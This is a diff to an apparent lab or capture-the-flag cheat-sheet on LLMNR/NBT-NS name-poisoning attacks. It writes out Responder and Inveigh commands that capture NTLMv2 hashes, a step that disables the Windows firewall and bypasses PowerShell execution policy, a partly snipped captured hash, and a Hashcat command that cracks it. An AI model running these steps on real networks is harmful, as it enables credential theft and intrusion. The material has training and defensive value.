@@ -2,8 +2,19 @@
 LLMNR and NBT-NS poisoning attack
 ==================================================================================================================
 
-STEP 1 - Dumping NTLMV2 hashes with the tool RESPONDER
-------------------------------------------------------------------------------------------------------------------
+> Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic
+  as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. 
+> If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system.
+> The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through Network Sniffing
+  and crack the hashes offline through Brute Force to obtain the plaintext passwords.
+
+
+==================================================================================================================
+STEP 1 - Dumping NTLMV2 hashes
+==================================================================================================================
+
+Example 1 - Dumping NTLMV2 hashes with the tool RESPONDER
+==================================================================================================================
 
 jeff@kali:~/Documents/CTFs/BadBlood$ sudo responder -I eth0 -w -r -f
                                          __
@@ -16,7 +27,6 @@ jeff@kali:~/Documents/CTFs/BadBlood$ sudo responder -I eth0 -w -r -f
 
   Author: Laurent Gaffie (laurent.gaffie@gmail.com)
   To kill this script hit CTRL-C
-
 
 [+] Poisoners:
     LLMNR                      [ON]
@@ -165,9 +175,63 @@ drwxr-xr-x 9 root root  4096 Apr 15 05:43 ..
 -rw-r--r-- 1 root root  5012 Apr 15 05:43 SMB-NTLMv2-SSP-192.168.1.50.txt
 
 
-------------------------------------------------------------------------------------------------------------------
+Example 2 - Dumping NTLMV2 hashes with 'PowerShell Inveigh'
+==================================================================================================================
+
+=> Start an elevated CMD shell (local admin) and disable the FW
+
+PS C:\AD\Tools\Inveigh-master> netsh advfirewall set allprofiles state off
+Ok.
+
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>cd C:\AD
+C:\AD>cd Tools
+C:\AD\Tools>cd Inveigh-master
+
+C:\AD\Tools\Inveigh-master>powershell -ep bypass
+Windows PowerShell
+Copyright (C) 2016 Microsoft Corporation. All rights reserved.
+
+PS C:\AD\Tools\Inveigh-master> . .\Inveigh.ps1
+
+PS C:\AD\Tools\Inveigh-master> Invoke-Inveigh -ConsoleOutput Y
+
+[*] Inveigh 1.505 started at 2020-09-15T15:50:14
+[+] Elevated Privilege Mode = Enabled
+[+] Primary IP Address = 172.16.100.122
+[+] Spoofer IP Address = 172.16.100.122
+[+] ADIDNS Spoofer = Disabled
+[+] DNS Spoofer = Enabled
+[+] DNS TTL = 30 Seconds
+[+] LLMNR Spoofer = Enabled
+[+] LLMNR TTL = 30 Seconds
+[+] mDNS Spoofer = Disabled
+[+] NBNS Spoofer = Disabled
+[+] SMB Capture = Enabled
+[+] HTTP Capture = Enabled
+[+] HTTPS Capture = Disabled
+[+] HTTP/HTTPS Authentication = NTLM
+[+] WPAD Authentication = NTLM
+[+] WPAD NTLM Authentication Ignore List = Firefox
+[+] WPAD Response = Enabled
+[+] Kerberos TGT Capture = Disabled
+[+] Machine Account Capture = Disabled
+[+] Console Output = Full
+[+] File Output = Disabled
+WARNING: [!] Run Stop-Inveigh to stop
+[*] Press any key to stop console output
+
+[+] [2020-09-15T15:50:15] SMB(445) NTLM challenge 4962223FA4ADE079 sent to 192.168.1.50:52844
+[+] [2020-09-15T15:50:15] SMB(445) NTLMv2 captured for security-lab\auditor from 192.168.1.50( ):52844:
+auditor::security-lab::CD1935E8AF6B24D5948D7B97D<SNIP>:010100000000000073E40794B28BD601E955ED6001E75F880000000002000A00640063006F007200700001001800440043004F00520050002D0053<SNIP>
+<SNIP>
+
+
+==================================================================================================================
 STEP 2 - Cracking the NTLMV2 hashes with the tool Hashcat
-------------------------------------------------------------------------------------------------------------------
+==================================================================================================================
 
 jeff@kali:~/Documents/CTFs/BadBlood$ sudo hashcat -m 5600 -a 3 /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.50.txt /home/jeff/Documents/CTFs/BadBlood/password-dico-test.txt --force
 
